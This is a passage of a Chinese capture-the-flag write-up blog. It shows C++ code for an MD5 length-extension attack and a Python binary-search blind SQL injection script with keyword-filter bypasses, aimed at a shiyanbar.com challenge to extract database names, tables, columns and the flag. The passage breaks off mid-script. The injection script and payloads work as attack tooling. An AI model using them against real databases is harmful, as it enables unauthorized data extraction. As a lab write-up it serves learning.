<span class="keyword">int</span> MAXN = <span class="number">1e2</span>;</span><br><span class="line">    <span class="keyword">static</span> uint s_state[<span class="number">4</span>];<span class="comment">//最开始的默认静态渐变变量</span></span><br><span class="line">    uint state[<span class="number">4</span>];<span class="comment">//这个也是默认渐变变量，但是会改变</span></span><br><span class="line">    <span class="keyword">static</span> uint rolarray[<span class="number">4</span>][<span class="number">4</span>];<span class="comment">//位移数组</span></span><br><span class="line">    <span class="keyword">static</span> uint mN[<span class="number">4</span>][<span class="number">16</span>];<span class="comment">//对M数组的处理</span></span><br><span class="line">    uint curM;<span class="comment">//当前处理的直接在整个数据中的位置</span></span><br><span class="line">    uint lenZ;<span class="comment">//数据的总长&#123;进行扩充处理后的数据总长，这个数是64的倍数&#125;</span></span><br><span class="line">    uint offset;<span class="comment">//需要从第几组开始处理</span></span><br><span class="line">    uint Tarr[<span class="number">64</span>];<span class="comment">//当前保存的T数组数据</span></span><br><span class="line">    uint Memory[<span class="number">64</span> + <span class="number">5</span>];<span class="comment">//当前要处理的64个字节数据</span></span><br><span class="line">    uint M[<span class="number">16</span>];<span class="comment">//将64个字节数据分为16个数</span></span><br><span class="line">    MD5();</span><br><span class="line">    MD5(<span class="built_in">string</span> str, <span class="keyword">int</span> noffset);</span><br><span class="line">    <span class="comment">//数据处理函数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> uint <span class="title">F</span><span class="params">(uint X, uint Y, uint Z)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> uint <span class="title">G</span><span class="params">(uint X, uint Y, uint Z)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> uint <span class="title">H</span><span class="params">(uint X, uint Y, uint Z)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> uint <span class="title">I</span><span class="params">(uint X, uint Y, uint Z)</span></span>;</span><br><span class="line">    <span class="comment">//循环左移函数</span></span><br><span class="line">    <span class="function">uint <span class="title">ROL</span><span class="params">(uint s, uint ws)</span></span>;</span><br><span class="line">    <span class="comment">//过程处理函数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">FF</span><span class="params">(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">GG</span><span class="params">(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">HH</span><span class="params">(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">II</span><span class="params">(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span></span>;</span><br><span class="line">    <span class="comment">//生成T数组单个数据的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> uint <span class="title">T</span><span class="params">(uint i)</span></span>;</span><br><span class="line">    <span class="comment">//将总数据中的64个字节移到Memory数组中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">data_Init</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//建立M数组</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create_M_arr</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//移动a,b,c,d，规则在前面介绍了</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">l_data_change</span><span class="params">(uint *buf)</span></span>;</span><br><span class="line">    <span class="comment">//产生T数组</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create_T_arr</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//得到最终MD5值</span></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">get_MD5</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//过程处理</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">processing</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">uint MD5::rolarray[<span class="number">4</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">        &#123; <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span> &#125;,</span><br><span class="line">        &#123; <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span> &#125;,</span><br><span class="line">        &#123; <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span> &#125;,</span><br><span class="line">        &#123; <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">uint MD5::mN[<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">        &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> &#125;,</span><br><span class="line">        &#123; <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span> &#125;,</span><br><span class="line">        &#123; <span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span> &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">传统渐变变量</span></span><br><span class="line"><span class="comment">0x67452301,</span></span><br><span class="line"><span class="comment">0xefcdab89,</span></span><br><span class="line"><span class="comment">0x98badcfe,</span></span><br><span class="line"><span class="comment">0x10325476</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这四个东西是可以根据要求更改的，如果取上述几个数则和经常用的MD5算出的结果是一样的</span></span><br><span class="line"><span class="comment">对了，由于有些数据是静态的，改变之后不会进行需要重新进行复制</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">uint MD5::s_state[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0xb2801557</span>,</span><br><span class="line">        <span class="number">0x06f3656c</span>,</span><br><span class="line">        <span class="number">0x644f6d37</span>,</span><br><span class="line">        <span class="number">0xc7b53ce5</span></span><br><span class="line">&#125;;<span class="comment">//已经按小端规则反处理哈希值了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MD5::MD5() &#123;&#125;</span><br><span class="line"></span><br><span class="line">MD5::MD5(<span class="built_in">string</span> str, <span class="keyword">int</span> noffset = <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    offset = noffset;</span><br><span class="line">    curM = (noffset - <span class="number">1</span>) * <span class="number">64</span>;<span class="comment">//从0位置处开始处理</span></span><br><span class="line">    init_str = str;<span class="comment">//对数据字符串进行处理</span></span><br><span class="line">    lenZ = init_str.length();</span><br><span class="line">    <span class="built_in">memset</span>(init_arr, <span class="number">0</span>, <span class="keyword">sizeof</span>(init_arr));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lenZ; i ++)</span><br><span class="line">        init_arr[i] = str[i];<span class="comment">//最终的数据数组进行赋值</span></span><br><span class="line">    <span class="comment">/*将数据扩充到取模64个字节等于56个字节</span></span><br><span class="line"><span class="comment">      第一个填充0x80，然后就是0x00了*/</span></span><br><span class="line">    <span class="keyword">if</span>(lenZ % <span class="number">64</span> != <span class="number">56</span>) init_arr[lenZ ++] = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">while</span>(lenZ % <span class="number">64</span> != <span class="number">56</span>)</span><br><span class="line">        init_arr[lenZ ++] = <span class="number">0x00</span>;</span><br><span class="line"><span class="comment">//最后8个字节保存了没扩充钱位数的多少，记住是位数的个数不是字节的个数，同时是按照小端规则</span></span><br><span class="line">    uint lengthbits = init_str.length() * <span class="number">8</span>;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &amp; <span class="number">0xff</span>;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">    init_arr[lenZ ++] = lengthbits &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="comment">//因为uint最多32位所以我们只要考虑四个字节就可以了，虽然实际上要考虑64位</span></span><br><span class="line">    lenZ += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i ++)</span><br><span class="line">        state[i] = s_state[i];<span class="comment">//将最开始的默认静态渐变变量赋值给静态渐变变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> uint MD5::F(uint X, uint Y, uint Z)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (X &amp; Y) | ((~X) &amp; Z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> uint MD5::G(uint X, uint Y, uint Z)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (X &amp; Z) | (Y &amp; (~Z));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> uint MD5::H(uint X, uint Y, uint Z)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> X ^ Y ^ Z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> uint MD5::I(uint X, uint Y, uint Z)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> Y ^ (X | (~Z));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint MD5::ROL(uint s, uint ws)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (s &lt;&lt; ws) | (s &gt;&gt; (<span class="number">32</span> - ws));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> MD5::FF(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span><br><span class="line">&#123;</span><br><span class="line">    a = ROL(a + F(b, c, d) + x + ac, s) + b;</span><br><span class="line">    <span class="comment">//printf("ff\n");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> MD5::GG(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span><br><span class="line">&#123;</span><br><span class="line">    a = ROL(a + G(b, c, d) + x + ac, s) + b;</span><br><span class="line">    <span class="comment">//printf("gg\n");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> MD5::HH(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac)</span><br><span class="line">&#123;</span><br><span class="line">    a = ROL(a + H(b, c, d) + x + ac, s) + b;</span><br><span class="line">    <span class="comment">//printf("hh\n");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> MD5::II(uint &amp;a, uint b, uint c, uint d, uint x, uint s, uint ac) &#123;</span><br><span class="line">    a = ROL(a + I(b, c, d) + x + ac, s) + b;</span><br><span class="line">    <span class="comment">//printf("ii\n");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> uint MD5::T(uint i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (uint)((<span class="number">0xffffffff</span> + <span class="number">1L</span>L) * <span class="built_in">abs</span>(<span class="built_in">sin</span>(i)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取64个字节放在Memory数组中</span></span><br><span class="line"><span class="keyword">void</span> MD5::data_Init()</span><br><span class="line">&#123;</span><br><span class="line">    uint tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i ++)</span><br><span class="line">        Memory[i] = init_arr[curM + i];</span><br><span class="line">    curM += <span class="number">64</span>;<span class="comment">//变化位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> MD5::create_T_arr()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">64</span>; i ++)</span><br><span class="line">        Tarr[i - <span class="number">1</span>] = T(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里使用了小端将数据存在M数组中，可以稍微思考一下</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span> MD5::create_M_arr()</span><br><span class="line">&#123;</span><br><span class="line">    uint tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j --)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp |= Memory[i + j];</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            tmp &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        M[cnt ++] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//移动a,b,c,d，最后一个移到第一个</span></span><br><span class="line"><span class="keyword">void</span> MD5::l_data_change(uint *buf)</span><br><span class="line">&#123;</span><br><span class="line">    uint buftmp[<span class="number">4</span>] = &#123;buf[<span class="number">3</span>], buf[<span class="number">0</span>], buf[<span class="number">1</span>], buf[<span class="number">2</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">        buf[i] = buftmp[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> MD5::processing()</span><br><span class="line">&#123;</span><br><span class="line">    uint statetmp[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">        statetmp[i] = state[i];</span><br><span class="line"><span class="comment">//这里的处理只是为了更方便的循环</span></span><br><span class="line">    uint * a = &amp;statetmp[<span class="number">0</span>];</span><br><span class="line">    uint * b = &amp;statetmp[<span class="number">1</span>];</span><br><span class="line">    uint * c = &amp;statetmp[<span class="number">2</span>];</span><br><span class="line">    uint * d = &amp;statetmp[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//产生M数组和T数组</span></span><br><span class="line">    create_M_arr();</span><br><span class="line">    create_T_arr();</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        建立函数指针数组</span></span><br><span class="line"><span class="comment">        循环处理</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    deal_fun d_fun[<span class="number">4</span>] = &#123;</span><br><span class="line">            &amp;MD5::FF, &amp;MD5::GG, &amp;MD5::HH, &amp;MD5::II</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j ++)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">this</span> -&gt;* d_fun[i])(*a, *b, *c, *d, M[mN[i][j]], rolarray[i][j % <span class="number">4</span>], Tarr[i * <span class="number">16</span> + j]);</span><br><span class="line">            l_data_change(statetmp);<span class="comment">//交换a,b,c,d</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++)</span><br><span class="line">        state[i] += statetmp[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> MD5::get_MD5()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> result;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">15</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (lenZ - (offset - <span class="number">1</span>) * <span class="number">64</span>) / <span class="number">64</span>; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        data_Init();</span><br><span class="line">        processing();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//小端显示</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i ++) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(tmp, <span class="string">"%02x"</span>, state[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">        result += tmp;</span><br><span class="line">        <span class="built_in">sprintf</span>(tmp, <span class="string">"%02x"</span>, state[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        result += tmp;</span><br><span class="line">        <span class="built_in">sprintf</span>(tmp, <span class="string">"%02x"</span>, state[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        result += tmp;</span><br><span class="line">        <span class="built_in">sprintf</span>(tmp, <span class="string">"%02x"</span>, state[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        result += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">MD5 <span class="title">md1</span><span class="params">(<span class="string">"123456789123456adminadmin123456789123456789123456789123456789123admin"</span>, <span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; md1.get_MD5() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到的hash值作为getmein的值post后得到flag。</p>
+<p>参考网站：<br><a href="https://blog.csdn.net/wy_97/article/details/76269819" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/76269819</a></p>
+<h1 id="认真一点！"><a href="#认真一点！" class="headerlink" title="认真一点！"></a>认真一点！</h1><p>一直都很认真的<br><a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">解题链接</a></p>
+<p>输入id=1或者id=0得到的结果不同，故此题的思路应为盲注。</p>
+<p>经过测试之后发现，union、and、substr、sleep、or等都被过滤了。还发现or可以用oorr或者Or代替。</p>
+<p>看了<a href="https://blog.csdn.net/qq_35078631/article/details/79220465" target="_blank" rel="noopener">大佬的博客</a>直接拿了二分盲注脚本搞定了。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class="line">temp = <span class="number">0</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"ctf5.shiyanbar.com"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"81"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_payload</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> target.replace(<span class="string">' '</span>,<span class="string">'%09'</span>).replace(<span class="string">'or'</span>,<span class="string">'Or'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(target)</span>:</span>     <span class="comment">#获取字段长度</span></span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    <span class="keyword">global</span> url  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">print</span> i </span><br><span class="line">        payload = target[:<span class="number">-5</span>]+str(i)+target[<span class="number">-5</span>:]</span><br><span class="line">        payload = urllib.unquote(make_payload(payload))</span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        data = &#123;<span class="string">"id"</span>:payload,<span class="string">"submit"</span>:<span class="string">"%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"</span>&#125;</span><br><span class="line">        content = requests.post(url=url,headers=headers,data=data).text</span><br><span class="line">        <span class="comment">#print content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search2</span><span class="params">(l,r,target)</span>:</span>    <span class="comment">#二分盲注喽，求单字节</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;r:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    <span class="keyword">global</span> url </span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    mid = (l+r)/<span class="number">2</span></span><br><span class="line">    payload = target[:<span class="number">-5</span>]+str(mid)+target[<span class="number">-5</span>:]</span><br><span class="line">    payload = urllib.unquote(make_payload(payload))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    data = &#123;<span class="string">"id"</span>:payload,<span class="string">"submit"</span>:<span class="string">"%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"</span>&#125;</span><br><span class="line">    content = requests.post(url=url,headers=headers,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> content:</span><br><span class="line">        temp = max(temp,mid)</span><br><span class="line">        search2(mid+<span class="number">1</span>,r,target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        search2(l,mid<span class="number">-1</span>,target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(column,table,offset,len,where,sign)</span>:</span>    <span class="comment">#这么多参数是为了构造payload</span></span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len+<span class="number">1</span>):</span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> sign==<span class="number">0</span>:</span><br><span class="line">            payload = <span class="string">"0'Or(select ascii((select mid("</span>+str(column)+<span class="string">" from "</span>+str(i)+<span class="string">") from "</span>+str(table)+<span class="string">" limit 1 offset "</span>+str(offset)+<span class="string">"))&gt;=)Or'0"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = <span class="string">"0'Or(select ascii((select mid("</span>+str(column)+<span class="string">" from "</span>+str(i)+<span class="string">") from "</span>+str(table)+<span class="string">" "</span>+str(where)+<span class="string">" limit 1 offset "</span>+str(offset)+<span class="string">"))&gt;=)Or'0"</span></span><br><span class="line">        search2(<span class="number">0</span>,<span class="number">255</span>,payload)</span><br><span class="line">        content+=chr(temp)</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------获取数据库名--------</span></span><br><span class="line"><span class="comment">#payload = "0'Or(length((select schema_name from information_schema.schemata limit 1 offset 1))=)Or'0"</span></span><br><span class="line"><span class="comment">#len = get_length(payload) #18</span></span><br><span class="line"><span class="comment">#database = get_content('schema_name','information_schema.schemata',"1",18,0,0) #ctf_sql_bool_blind#test</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------获取表名--------</span></span><br><span class="line"><span class="comment">#payload = "0'Or(length((select table_name from information_schema.tables where table_schema=0x6374665f73716c5f626f6f6c5f626c696e64 limit 1 offset 0))=)Or'0"</span></span><br><span class="line"><span class="comment">#len = get_length(payload) #4,5</span></span><br><span class="line"><span class="comment">#table = get_content('table_name','information_schema.tables',"0",4,'where table_schema=0x6374665f73716c5f626f6f6c5f626c696e64',1) #fiag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------获取列名--------</span></span><br><span class="line"><span class="comment">#payload = "0'Or(length((select column_name from information_schema.columns where table_name=0x66696167 limit 1 offset 0))=)Or'0"</span></span><br><span class="line"><span class="comment">#len = get_length(payload) #5</span></span><br><span class="line"><span class="comment">#column = get_content('column_name','information_schema.columns',"0",5,'where table_name=0x66696167',1) #fL$4G</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------获取字段内容--------</span></span><br><span class="line"><span class="comment">#payload = "0'Or(length((select fL$4G from fiag  limit 1 offset 0))=)Or'0"</span></span><br><span class="line"><span 